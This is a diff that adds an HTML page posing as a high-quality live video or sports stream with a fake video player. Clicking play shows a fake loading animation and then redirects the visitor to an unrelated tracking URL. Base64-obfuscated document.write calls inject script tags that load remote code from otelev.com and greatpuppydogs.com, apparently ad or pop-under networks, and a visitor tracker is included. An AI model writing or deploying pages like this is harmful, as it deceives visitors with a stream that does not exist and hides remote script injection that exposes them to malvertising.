@@ -1,1 +1,413 @@
-ok
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width,initial-scale=1" />
+<title>ENJOY NOW HIGH QUALITY VIDEOS</title>
+<meta name="description" content="Here Way to ENJOY NOW HIGH QUALITY VIDEOS Online Without Buffering. Support Android, iPhone, iPad, Tablet." />
+<link rel="icon" type="image/png" href="https://sportsmasters.live/Taylor-vs-Pili/logo.png">
+<style>
+  :root {
+    --blue-glow-1: rgba(0,191,255,0.25);
+    --blue-glow-2: rgba(173,216,230,0.35);
+    --white-glow: rgba(255,255,255,0.15);
+  }
+
+  body {
+    margin: 0;
+    padding: 0;
+    min-height: 100vh;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    background: #0c0e11;
+    color: #fff;
+    font-family: Arial, sans-serif;
+  }
+
+  h1 {
+    margin: 24px 12px 10px;
+    font-size: 26px;
+    text-align: center;
+  }
+
+  /* Modal radiant glow */
+  .modal {
+    position: relative;
+    width: 940px;
+    max-width: 95%;
+    aspect-ratio: 16/9;
+    border-radius: 14px;
+    overflow: hidden;
+    background: #000;
+    box-shadow:
+      0 0 15px var(--blue-glow-1),
+      0 0 30px var(--blue-glow-2),
+      0 0 45px var(--white-glow);
+    transition: box-shadow .4s ease;
+  }
+  .modal:hover {
+    box-shadow:
+      0 0 18px rgba(0,191,255,0.28),
+      0 0 34px rgba(173,216,230,0.43),
+      0 0 60px rgba(255,255,255,0.18);
+  }
+
+  .modal .hover-tint {
+    position: absolute;
+    inset: 0;
+    background: rgba(0,0,0,0);
+    pointer-events: none;
+    transition: background .22s ease;
+    z-index: 4;
+  }
+  .modal:hover .hover-tint { background: rgba(0,0,0,0.12); }
+
+  video {
+    width: 100%;
+    height: 100%;
+    object-fit: cover;
+    display: block;
+    background: #000;
+  }
+
+  .play-btn {
+    position: absolute;
+    top: 50%;
+    left: 50%;
+    transform: translate(-50%, -50%);
+    width: 90px;
+    height: 90px;
+    border-radius: 50%;
+    background: rgba(255,0,0,0.92);
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    cursor: pointer;
+    z-index: 6;
+    box-shadow: 0 0 15px rgba(255,0,0,0.6);
+    animation: playPulse 1.8s infinite;
+    transition: opacity .4s ease, transform .18s ease;
+    opacity: 1;
+  }
+  .play-btn:hover { transform: translate(-50%, -50%) scale(1.08); }
+  .play-btn.fade-out { opacity: 0; pointer-events: none; }
+  .play-btn::before {
+    content: "";
+    width: 0; height: 0;
+    border-left: 25px solid #fff;
+    border-top: 15px solid transparent;
+    border-bottom: 15px solid transparent;
+    margin-left: 5px;
+  }
+  @keyframes playPulse {
+    0% { box-shadow: 0 0 12px rgba(255,0,0,0.5); }
+    50% { box-shadow: 0 0 28px rgba(255,0,0,0.95); }
+    100% { box-shadow: 0 0 12px rgba(255,0,0,0.5); }
+  }
+
+  .loader {
+    position: absolute;
+    width: 72px;
+    height: 72px;
+    border-radius: 50%;
+    border: 7px solid rgba(255,255,255,0.16);
+    border-top: 7px solid #4cc9f0;
+    top: 50%;
+    left: 50%;
+    transform: translate(-50%,-50%);
+    display: none;
+    z-index: 8;
+    animation: spin 1s linear infinite;
+  }
+  @keyframes spin { 0%{transform:translate(-50%,-50%) rotate(0deg);} 100%{transform:translate(-50%,-50%) rotate(360deg);} }
+
+  .loading-text {
+    position: absolute;
+    top: calc(50% + 56px);
+    left: 50%;
+    transform: translateX(-50%);
+    font-size: 15px;
+    color: #fff;
+    opacity: .95;
+    display: none;
+    z-index: 8;
+  }
+
+  .shimmer {
+    position: absolute;
+    inset: 0;
+    pointer-events: none;
+    z-index: 5;
+    display: none;
+    overflow: hidden;
+  }
+  .shimmer::before {
+    content: "";
+    position: absolute;
+    top: -40%;
+    left: -25%;
+    width: 50%;
+    height: 180%;
+    background: linear-gradient(120deg, rgba(255,255,255,0) 0%, rgba(255,255,255,0.06) 50%, rgba(255,255,255,0) 100%);
+    transform: translateX(-30%);
+    filter: blur(10px);
+    animation: shimmerMove 1.8s linear infinite;
+  }
+  @keyframes shimmerMove {
+    0%{ transform:translateX(-30%) rotate(12deg); opacity:0; }
+    10%{ opacity:1; }
+    90%{ opacity:1; }
+    100%{ transform:translateX(130%) rotate(12deg); opacity:0; }
+  }
+
+  /* WATCH LIVE SECTION */
+  .watch-live {
+    text-align: center;
+    margin-top: 25px;
+  }
+
+  .watch-btn {
+    display: inline-block;
+    margin-bottom: 25px;
+    background: linear-gradient(180deg, #ff1a1a, #cc0000);
+    color: #fff;
+    font-weight: 700;
+    border: none;
+    border-radius: 8px;
+    padding: 14px 36px;
+    font-size: 16px;
+    cursor: pointer;
+    box-shadow: 0 0 18px rgba(255, 0, 0, 0.6);
+    transition: all 0.3s ease;
+  }
+  .watch-btn:hover {
+    transform: scale(1.05);
+    box-shadow: 0 0 25px rgba(255, 0, 0, 0.9);
+  }
+
+  .promo-img {
+    margin: 10px auto 22px;
+    max-width: 340px;
+    border-radius: 10px;
+    overflow: hidden;
+    box-shadow: 0 0 14px rgba(255,255,255,0.12);
+  }
+  .promo-img img {
+    width: 100%;
+    display: block;
+    height: auto;
+    border-radius: 10px;
+  }
+
+  .description {
+    font-size: 15px;
+    font-weight: 600;
+    color: #fff;
+    max-width: 880px;
+    margin: 0 auto 16px;
+    line-height: 1.6;
+    text-align: center;
+  }
+
+  .device-features__brands {
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    gap: 22px;
+    margin: 12px 0 35px;
+    flex-wrap: wrap;
+  }
+  .device-features__brands img {
+    width: 34px;
+    height: auto;
+    opacity: 0.85;
+    transition: opacity 0.3s ease, transform 0.3s ease;
+  }
+  .device-features__brands img:hover {
+    opacity: 1;
+    transform: scale(1.1);
+  }
+
+  /* ADS */
+  .ad-slot {
+    background: rgba(255,255,255,0.05);
+    border: 1px dashed rgba(255,255,255,0.15);
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    color: #ccc;
+    margin: 25px auto;
+    border-radius: 6px;
+  }
+  .ad-728x90 {
+    width: 728px;
+    height: 90px;
+    max-width: 96%;
+  }
+  .ad-300x250 {
+    width: 300px;
+    height: 250px;
+  }
+
+  footer {
+    width: 100%;
+    background: #0a0c0f;
+    padding: 14px 26px;
+    color: #aaa;
+    margin-top: auto;
+    text-align: center;
+    font-size: 14px;
+    border-top: 1px solid rgba(255,255,255,0.04);
+  }
+  footer a {
+    color: #bbb;
+    margin: 0 10px;
+    text-decoration: none;
+  }
+
+  @media (max-width:768px){
+    h1{ font-size:20px; }
+    .play-btn{ width:70px; height:70px; }
+    .shimmer::before{ display:none; }
+  }
+  @media (max-width:480px){
+    .loading-text{ font-size:14px; top:calc(50% + 50px); }
+    .watch-btn { width: 90%; font-size: 15px; padding: 12px 0; }
+    .description { font-size: 14px; }
+  }
+</style>
+</head>
+<body>
+    <br>
+  <h1 id="pageTitle">ENJOY NOW HIGH QUALITY VIDEOS</h1>
+<br>
+
+<center>
+<script>document.write(atob("PHNjcmlwdD4KICBhdE9wdGlvbnMgPSB7CiAgICAna2V5JyA6ICczODYwOTRiY2JmMTQwZThjMWRiNzU1YWI5NmUxYjlkYycsCiAgICAnZm9ybWF0JyA6ICdpZnJhbWUnLAogICAgJ2hlaWdodCcgOiA1MCwKICAgICd3aWR0aCcgOiAzMjAsCiAgICAncGFyYW1zJyA6IHt9CiAgfTsKPC9zY3JpcHQ+CjxzY3JpcHQgc3JjPSJodHRwczovL290ZWxldi5jb20vMjIvMzg2MDk0YmNiZjE0MGU4YzFkYjc1NWFiOTZlMWI5ZGMiPjwvc2NyaXB0Pg=="));</script>
+</center>
+<br>
+</br>
+
+  <div class="modal" id="videoModal">
+    <video id="liveVideo" poster="https://i.postimg.cc/J7xkWZWV/open.jpg" preload="metadata">
+      <source src="your-video.mp4" type="video/mp4">
+      Your browser does not support the video tag.
+    </video>
+    <div class="hover-tint"></div>
+    <div class="shimmer" id="shimmer"></div>
+    <div class="play-btn" id="playButton" title="Play"></div>
+    <div class="loader" id="loader"></div>
+    <div class="loading-text" id="loadingText">Loading... Please wait</div>
+  </div>
+<br>
+<br>
+
+<center>
+<script>document.write(atob("PHNjcmlwdD4KICBhdE9wdGlvbnMgPSB7CiAgICAna2V5JyA6ICcxODM5NWYwYTQwMzVlNDIyNzU2ZWE4YjE2YmZmMzM2MCcsCiAgICAnZm9ybWF0JyA6ICdpZnJhbWUnLAogICAgJ2hlaWdodCcgOiAyNTAsCiAgICAnd2lkdGgnIDogMzAwLAogICAgJ3BhcmFtcycgOiB7fQogIH07Cjwvc2NyaXB0Pgo8c2NyaXB0IHNyYz0iaHR0cHM6Ly9vdGVsZXYuY29tLzIyLzE4Mzk1ZjBhNDAzNWU0MjI3NTZlYThiMTZiZmYzMzYwIj48L3NjcmlwdD4="));</script>
+</center>
+<br>
+</br>
+    <p class="description">
+     Watch The ENJOY NOW HIGH QUALITY VIDEOS from Anywhere at Anytime.
+    Optimized for PC, Mac, iPad, iPhone, Android, PS4, Xbox One, and Smart TVs.
+    </p>
+    <div class="device-features__brands">
+      <img src="img/channels/devices_pc.png" alt="All Devices" />
+      <img src="img/channels/apple_pc.png" alt="iOS" />
+      <img src="img/channels/android_pc.png" alt="Android" />
+      <img src="img/channels/chromecast_pc.png" alt="Chromecast" />
+    </div>
+  </section>
+  	<center>
+	
+	</center>
+  <footer>
+    <div> © sportsmasters.live | All rights reserved</div>
+    <br>
+    <div>
+      <a href="#">DMCA</a> | <a href="#">Privacy Policy</a> | <a href="#">Contact Us</a>
+    </div>
+  </footer>
+<script>
+(function(){
+  const params = new URLSearchParams(window.location.search);
+  const liveParam = params.get('m');
+  const pageTitle = document.getElementById('pageTitle');
+  const video = document.getElementById('liveVideo');
+  const playBtn = document.getElementById('playButton');
+  const loader = document.getElementById('loader');
+  const loadingText = document.getElementById('loadingText');
+  const shimmer = document.getElementById('shimmer');
+  const watchBtn = document.getElementById('watchNowBtn');
+  const modal = document.getElementById('videoModal');
+
+  const redirectUrl = 'https://conservedaftconcede.com/snu7hp6dza?key=f44f1cf36a1878702ef1290ff81eeec8';
+  const LOAD_DELAY_MS = 3000;
+
+  if (liveParam){
+    let matchTitle = decodeURIComponent(liveParam.replace(/\+/g,' '));
+    matchTitle = matchTitle.replace(/\bvs\b/gi,'vs');
+    pageTitle.textContent = matchTitle + ' Live';
+    document.title = matchTitle + ' Live';
+  }
+
+  modal.addEventListener('mouseenter',()=>{ if(!video.hasAttribute('controls')) video.setAttribute('controls',''); });
+  modal.addEventListener('mouseleave',()=>{ if(video.paused) video.removeAttribute('controls'); });
+
+  function startRedirectSequence(){
+    loader.style.display = 'block';
+    loadingText.style.display = 'block';
+    shimmer.style.display = 'block';
+    playBtn.classList.add('fade-out');
+    video.removeAttribute('controls');
+    setTimeout(()=>{
+      shimmer.style.transition='opacity .6s ease';
+      loader.style.transition='opacity .6s ease';
+      loadingText.style.transition='opacity .6s ease';
+      shimmer.style.opacity='0';
+      loader.style.opacity='0';
+      loadingText.style.opacity='0';
+      setTimeout(()=>{ window.location.href = redirectUrl; },900);
+    },LOAD_DELAY_MS);
+  }
+
+  playBtn.addEventListener('click',startRedirectSequence);
+  watchBtn.addEventListener('click',startRedirectSequence);
+
+  playBtn.tabIndex=0;
+  playBtn.addEventListener('keydown',e=>{
+    if(e.key==='Enter'||e.key===' '){ e.preventDefault(); startRedirectSequence(); }
+  });
+
+  video.addEventListener('pause',()=>{ if(loader.style.display==='block') return; playBtn.classList.remove('fade-out'); });
+  video.addEventListener('play',()=>{ playBtn.classList.add('fade-out'); });
+
+  window.addEventListener('pageshow',()=>{
+    loader.style.display='none';
+    loadingText.style.display='none';
+    shimmer.style.display='none';
+    shimmer.style.opacity='1';
+    loader.style.opacity='1';
+    loadingText.style.opacity='1';
+    playBtn.classList.remove('fade-out');
+    video.pause();
+    video.currentTime=0;
+    video.removeAttribute('controls');
+  });
+
+  video.removeAttribute('controls');
+})();
+</script>
+<script type="text/javascript">var _Hasync= _Hasync|| [];
+_Hasync.push(['Histats.start', '1,4896563,4,0,0,0,00010000']);
+_Hasync.push(['Histats.fasi', '1']);
+_Hasync.push(['Histats.track_hits', '']);
+(function() {
+var hs = document.createElement('script'); hs.type = 'text/javascript'; hs.async = true;
+hs.src = ('//s10.histats.com/js15_as.js');
+(document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(hs);
+})();</script>
+</body>
+<script>document.write(atob("PHNjcmlwdCBkYXRhLWNmYXN5bmM9ImZhbHNlIiBzcmM9Imh0dHBzOi8vZ3JlYXRwdXBweWRvZ3MuY29tLzEvODFmNjRjODZkNTg2ODJiMDA4ODQ0ODFlZDMzMDI3NjIiPjwvc2NyaXB0Pg=="));</script>
+</html>
